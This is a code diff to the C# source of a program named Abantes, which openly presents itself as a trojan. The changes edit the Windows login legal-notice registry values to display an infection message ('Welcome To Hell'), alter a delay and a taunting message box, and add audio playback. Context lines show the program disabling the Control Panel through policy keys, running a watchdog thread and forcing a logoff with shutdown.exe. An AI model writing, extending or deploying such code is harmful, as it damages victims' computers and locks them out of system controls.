@@ -11,6 +11,7 @@ using System.Diagnostics;
 using Abantes.Properties;
 using Abantes.Payloads;
 using Abantes.Utils;
+using System.Media;
 using Microsoft.Win32.TaskScheduler;
 
 namespace Abantes
@@ -55,10 +56,10 @@ namespace Abantes
                 editKey.Close();
 
                 editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
-                editKey.SetValue("legalnoticecaption", "Important Information");
+                editKey.SetValue("legalnoticecaption", "Welcome To Hell");
                 editKey.Close();
                 editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
-                editKey.SetValue("legalnoticetext", "This Computer has been Infected by the Abantes Trojan. Now Enjoy Your Broken and Unusable PC");
+                editKey.SetValue("legalnoticetext", "This Computer has been Infected by the Abantes Trojan. Hope You Enjoy.");
                 editKey.Close();
                 editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                 editKey.SetValue("NoControlPanel", "1");
@@ -199,9 +200,9 @@ namespace Abantes
                 editKey.SetValue("AbantesWasHere", "1");
                 editKey.Close();
 
-                Thread.Sleep(8000);
+                Thread.Sleep(9000);
 
-                MessageBox.Show("Abantes Wants To Meet You","I Want Too Meet You");
+                MessageBox.Show("Abantes Wants To Meet You","Abantes Want Too Meet You");
 
                 Others.StartProcess("shutdown.exe", "/l /f");
             }
@@ -213,7 +214,10 @@ namespace Abantes
                 Thread watchdogThread = new Thread(new ThreadStart(Threads.WathcDogThread));
                 normalThread.Start();
                 watchdogThread.Start();
-                
+                WMPLib.WindowsMediaPlayer Player;
+                Player = new WMPLib.WindowsMediaPlayer();
+                Player.URL = Application.StartupPath + "\\Audio.mp3";
+                Player.controls.play();
             }
         }
     }
